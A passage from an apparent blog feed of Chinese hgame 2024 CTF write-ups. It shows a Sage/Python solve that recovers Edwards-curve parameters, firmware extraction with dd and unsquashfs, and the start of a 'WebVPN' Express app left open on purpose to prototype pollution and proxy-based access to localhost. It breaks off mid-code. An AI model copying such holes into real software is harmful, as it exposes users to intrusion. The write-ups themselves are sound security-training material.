class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>):</span><br><span class="line">            P = add(C, P, P)</span><br><span class="line">        m = m - <span class="number">2</span>**(l-<span class="number">1</span>)</span><br><span class="line">        Q, P = P, (u, v)</span><br><span class="line">        <span class="keyword">return</span> add(C, Q, mul(C, P, m))</span><br><span class="line"></span><br><span class="line">c, d, p = Curve</span><br><span class="line"></span><br><span class="line">G = (gx, gy)</span><br><span class="line">P = (<span class="number">423323064726997230640834352892499067628999846</span>, <span class="number">44150133418579337991209313731867512059107422186218072084511769232282794765835</span>)</span><br><span class="line">Q = (<span class="number">1033433758780986378718784935633168786654735170</span>, <span class="number">2890573833121495534597689071280547153773878148499187840022524010636852499684</span>)</span><br><span class="line">S = (<span class="number">875772166783241503962848015336037891993605823</span>, <span class="number">51964088188556618695192753554835667051669568193048726314346516461990381874317</span>)</span><br><span class="line">T = (<span class="number">612403241107575741587390996773145537915088133</span>, <span class="number">64560350111660175566171189050923672010957086249856725096266944042789987443125</span>)</span><br><span class="line"><span class="keyword">assert</span> ison(Curve, P) <span class="keyword">and</span> ison(Curve, Q) <span class="keyword">and</span> ison(Curve, G)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;eG = <span class="subst">&#123;mul(Curve, G, e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># eG = (40198712137747628410430624618331426343875490261805137714686326678112749070113, 65008030741966083441937593781739493959677657609550411222052299176801418887407)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/mumuhhh/p/18019200">2024 SICTF Round#3出题 crypto misc osint</a></p><p>​<a href="https://tangcuxiaojikuai.xyz/post/678d5ec.html">2024-SICTF-#Round3-wp-crypto</a></p><p>​<a href="https://tangcuxiaojikuai.xyz/post/187210a7.html">Crypto趣题-曲线</a></p><p>先求出G在 Weierstrass 上的值，再转换回去即可得到原先的G</p><p>exp:</p><p>求p，d，c^2:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">happy</span>(<span class="params">C, P</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Verification points are on the curve</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c, d, p = C</span><br><span class="line">    u, v = P</span><br><span class="line">    <span class="keyword">return</span> (u**<span class="number">2</span> + v**<span class="number">2</span> - cc * (<span class="number">1</span> + d * u**<span class="number">2</span>*v**<span class="number">2</span>)) % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_and_b</span>(<span class="params">u1,u2,v1,v2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Helper function used to simplify calculations</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a12 = u1**<span class="number">2</span> - u2**<span class="number">2</span> + v1**<span class="number">2</span> - v2**<span class="number">2</span></span><br><span class="line">    b12 = u1**<span class="number">2</span> * v1**<span class="number">2</span> - u2**<span class="number">2</span> * v2**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> a12, b12</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_modulus</span>(<span class="params">u1,u2,u3,u4,v1,v2,v3,v4</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Compute the modulus from four points</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a12, b12 = a_and_b(u1,u2,v1,v2)</span><br><span class="line">    a13, b13 = a_and_b(u1,u3,v1,v3)</span><br><span class="line">    a23, b23 = a_and_b(u2,u3,v2,v3)</span><br><span class="line">    a24, b24 = a_and_b(u2,u4,v2,v4)</span><br><span class="line"></span><br><span class="line">    p_almost = gcd(a12*b13 - a13*b12, a23*b24 - a24*b23)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span> p_almost % i == <span class="number">0</span>:</span><br><span class="line">            p_almost = p_almost // i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p_almost</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_sq_d</span>(<span class="params">u1,u2,v1,v2,p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Helper function to computer c^2 d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a1,b1 = a_and_b(u1,u2,v1,v2)</span><br><span class="line">    <span class="keyword">return</span> a1 * <span class="built_in">pow</span>(b1,-<span class="number">1</span>,p) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c</span>(<span class="params">u1,u2,v1,v2,p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Compute c^2, d from two points and known modulus</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ccd = c_sq_d(u1,u2,v1,v2,p)</span><br><span class="line">    cc = (u1**<span class="number">2</span> + v1**<span class="number">2</span> - ccd*u1**<span class="number">2</span>*v1**<span class="number">2</span>) % p</span><br><span class="line">    d = ccd * <span class="built_in">pow</span>(cc, -<span class="number">1</span>, p) % p</span><br><span class="line">    <span class="keyword">return</span> cc, d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P = (<span class="number">423323064726997230640834352892499067628999846</span>, <span class="number">44150133418579337991209313731867512059107422186218072084511769232282794765835</span>)</span><br><span class="line">Q = (<span class="number">1033433758780986378718784935633168786654735170</span>, <span class="number">2890573833121495534597689071280547153773878148499187840022524010636852499684</span>)</span><br><span class="line">S = (<span class="number">875772166783241503962848015336037891993605823</span>, <span class="number">51964088188556618695192753554835667051669568193048726314346516461990381874317</span>)</span><br><span class="line">T = (<span class="number">612403241107575741587390996773145537915088133</span>, <span class="number">64560350111660175566171189050923672010957086249856725096266944042789987443125</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">u1, v1 = P</span><br><span class="line">u2, v2 = Q</span><br><span class="line">u3, v3 = S</span><br><span class="line">u4, v4 = T</span><br><span class="line"></span><br><span class="line">p = find_modulus(u1,u2,u3,u4,v1,v2,v3,v4)</span><br><span class="line">cc, d = c(u1,u2,v1,v2,p)</span><br><span class="line"></span><br><span class="line">C = cc, d, p</span><br><span class="line"><span class="keyword">assert</span> happy(C, P)</span><br><span class="line"><span class="keyword">assert</span> happy(C, Q)</span><br><span class="line"><span class="keyword">assert</span> happy(C, S)</span><br><span class="line"><span class="keyword">assert</span> happy(C, T)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Found curve parameters&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c^2 = <span class="subst">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Found curve parameters</span></span><br><span class="line"><span class="string">p = 67943764351073247630101943221474884302015437788242536572067548198498727238923</span></span><br><span class="line"><span class="string">c^2 = 12908728488299650872377430201970332178171657588185291326485782119189255844928</span></span><br><span class="line"><span class="string">d = 8779982120820562807260290996171144226614358666469579196351820160975526615300</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>求G：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment">#part1 get c2、d</span></span><br><span class="line">P = (<span class="number">423323064726997230640834352892499067628999846</span>, <span class="number">44150133418579337991209313731867512059107422186218072084511769232282794765835</span>)</span><br><span class="line">Q = (<span class="number">1033433758780986378718784935633168786654735170</span>, <span class="number">2890573833121495534597689071280547153773878148499187840022524010636852499684</span>)</span><br><span class="line">S = (<span class="number">875772166783241503962848015336037891993605823</span>, <span class="number">51964088188556618695192753554835667051669568193048726314346516461990381874317</span>)</span><br><span class="line">T = (<span class="number">612403241107575741587390996773145537915088133</span>, <span class="number">64560350111660175566171189050923672010957086249856725096266944042789987443125</span>)</span><br><span class="line">eG = (<span class="number">40198712137747628410430624618331426343875490261805137714686326678112749070113</span>, <span class="number">65008030741966083441937593781739493959677657609550411222052299176801418887407</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">67943764351073247630101943221474884302015437788242536572067548198498727238923</span></span><br><span class="line">c2 = <span class="number">12908728488299650872377430201970332178171657588185291326485782119189255844928</span></span><br><span class="line">d = <span class="number">8779982120820562807260290996171144226614358666469579196351820160975526615300</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PR.&lt;c&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = c^<span class="number">2</span> - c2</span><br><span class="line"><span class="comment">#print(f.roots())</span></span><br><span class="line"></span><br><span class="line">c = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment">#c = f.roots()[1][0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#part2 map to ECC</span></span><br><span class="line">F = GF(p)</span><br><span class="line">dd = F(d*c^<span class="number">4</span>)</span><br><span class="line">A = F(<span class="number">2</span>) * F(a+dd) / F(a-dd)</span><br><span class="line">B = F(<span class="number">4</span>) / F(a-dd)</span><br><span class="line">a = F(<span class="number">3</span>-A^<span class="number">2</span>) / F(<span class="number">3</span>*B^<span class="number">2</span>)</span><br><span class="line">b = F(<span class="number">2</span>*A^<span class="number">3</span>-<span class="number">9</span>*A) / F(<span class="number">27</span>*B^<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edwards_to_ECC</span>(<span class="params">x,y</span>):</span><br><span class="line">    x1 = F(x) / F(c)</span><br><span class="line">    y1 = F(y) / F(c)</span><br><span class="line">    <span class="comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span></span><br><span class="line"></span><br><span class="line">    x2 = F(<span class="number">1</span>+y1) / F(<span class="number">1</span>-y1)</span><br><span class="line">    y2 = F(x2) / F(x1)</span><br><span class="line">    <span class="comment">#now curve is By^2 = x^3 + Ax^2 + x</span></span><br><span class="line"></span><br><span class="line">    x3 = (F(<span class="number">3</span>*x2) + F(A)) / F(<span class="number">3</span>*B)</span><br><span class="line">    y3 = F(y2) / F(B)</span><br><span class="line">    <span class="comment">#now curve is y^2 = x^3 + ax + b</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (x3,y3)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC_to_edwards</span>(<span class="params">x,y</span>):</span><br><span class="line">    x2 = (F(x) * F(<span class="number">3</span>*B) - F(A)) / F(<span class="number">3</span>)</span><br><span class="line">    y2 = F(y) * F(B)</span><br><span class="line">    <span class="comment">#now curve is By^2 = x^3 + Ax^2 + x</span></span><br><span class="line"></span><br><span class="line">    x1 = F(x2) / F(y2)</span><br><span class="line">    y1 = F(<span class="number">1</span>) - (F(<span class="number">2</span>) / F(x2+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#now curve is a*x^2+y^2 = 1+dd*x^2*y^2</span></span><br><span class="line"></span><br><span class="line">    x_ = F(x1) * F(c)</span><br><span class="line">    y_ = F(y1) * F(c)</span><br><span class="line">    <span class="comment">#now curve is a*x^2+y^2 = c^2(1+d*x^2*y^2)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (x_,y_)</span><br><span class="line"> </span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(edwards_to_ECC(P[<span class="number">0</span>],P[<span class="number">1</span>]))</span><br><span class="line">Q = E(edwards_to_ECC(Q[<span class="number">0</span>],Q[<span class="number">1</span>]))</span><br><span class="line">C = E(edwards_to_ECC(eG[<span class="number">0</span>],eG[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">t = gmpy2.invert(e,E.order())</span><br><span class="line"></span><br><span class="line">G = C * t</span><br><span class="line"></span><br><span class="line">G = ECC_to_edwards(G[<span class="number">0</span>],G[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line"><span class="comment"># print(hex(G[0]+G[1])[2:])</span></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;&quot;</span> + <span class="built_in">hex</span>(G[<span class="number">0</span>]+G[<span class="number">1</span>])[<span class="number">2</span>:] + <span class="string">&quot;&#125;&quot;</span> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(60509997141402220432457672116464144281323849418849996079955274693120169548926 : 64398762792438422614266845264105268512048378462904543894039824596662785909770 : 1)</span></span><br><span class="line"><span class="string">(10801522842243173004305732551018051267087389767241338575531365181016273121234, 45542712889400624552765069228326432314004665232870865493507801651803120421882)</span></span><br><span class="line"><span class="string">hgame&#123;7c91b51150e2339628f10c5be61d49bbf9471ef00c9b94bb0473feac06303bcc&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="IoT"><a href="#IoT" class="headerlink" title="IoT"></a>IoT</h1><h2 id="ez7621"><a href="#ez7621" class="headerlink" title="ez7621"></a>ez7621</h2><p>参考链接：<a href="https://iqqoz.com/post-3231.html#gsc.tab=0">提取路由器固件中的squashfs文件系统unsquashfs提取方法</a></p><p>从附件的bin里面提取出文件系统。</p><p>先用hexdump查看并定位squashfs的文件头（hsqs）位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdump -C ez7621.bin | grep hsqs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/./hgame2024_week4/i_1_4.png"></p><p>可见hsqs的开始位置是0x002b6442，dd命令是不支持16进制的，先转换为10进制，0x002b6442转为10进制后为2843714，接着可以构建dd命令了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=ez7621.bin of=ez7621.squashfs skip=1 bs=2843714</span><br></pre></td></tr></table></figure><p>这样就得到了ez7621.squashfs文件了，解压squashfs文件需要用到unsquashfs命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unsquashfs ez7621.squashfs</span><br></pre></td></tr></table></figure><p>运行该命令后，会在当前目录生成文件夹squashfs-root，里面就是解压出来的文件系统</p><p>接着在这个文件夹下面搜索名字带flag的文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find squashfs-root -name <span class="string">&quot;*flag*&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week4/i_1_1.png"></p><p>ida分析<code>mt7621-flag.ko</code></p><p><img src="/./hgame2024_week4/i_1_2.png"></p><p>取出<code>v0</code>的值，xor 爆破 key，即可得到 flag。</p><p><img src="/./hgame2024_week4/i_1_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> hgame </tag>
            
            <tag> IoT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week3 WP</title>
      <link href="/hgame2024_week3/"/>
      <url>/hgame2024_week3/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="WebVPN"><a href="#WebVPN" class="headerlink" title="WebVPN"></a>WebVPN</h2><p>源码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> session_name = <span class="string">&quot;my-webvpn-session-id-&quot;</span> + <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;pug&quot;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&quot;trust proxy&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;public&quot;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line">  <span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: session_name,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">uuidv4</span>().<span class="title function_">toString</span>(),</span><br><span class="line">    <span class="attr">secure</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 原型链污染 ，过滤 __</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">if</span> (!username) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> url = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">query</span>.<span class="property">url</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;invalid url.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url) <span class="keyword">return</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(url.<span class="property">hostname</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = req.<span class="property">headers</span>;</span><br><span class="line">    headers.<span class="property">host</span> = url.<span class="property">host</span>;</span><br><span class="line">    headers.<span class="property">cookie</span> = headers.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">cookie</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> filtered_cookie = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> [key, value] = cookie.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">trim</span>() !== session_name) &#123;</span><br><span class="line">        filtered_cookie += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>;`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> filtered_cookie;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> remote_res = <span class="keyword">await</span> (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">post</span>(url, req.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(url, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">405</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;method not allowed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    res.<span class="title function_">status</span>(remote_res.<span class="property">status</span>);</span><br><span class="line">    res.<span class="title function_">header</span>(remote_res.<span class="property">headers</span>);</span><br><span class="line">    res.<span class="title function_">write</span>(remote_res.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;unreachable url.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="keyword">typeof</span> username != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> password != <span class="string">&quot;string&quot;</span> ||</span><br><span class="line">    !username ||</span><br><span class="line">    !password</span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userStorage[username].<span class="property">password</span> !== password) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;invalid username or password&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;login success&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// under development</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/home&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;home&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">    <span class="attr">strategy</span>: (<span class="function">(<span class="params">list</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> result = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> list) &#123;</span><br><span class="line">        result.<span class="title function_">push</span>(&#123;<span class="attr">host</span>: key, <span class="attr">allow</span>: list[key]&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;)(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">strategy</span>),</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// demo service behind webvpn</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`app listen on <span 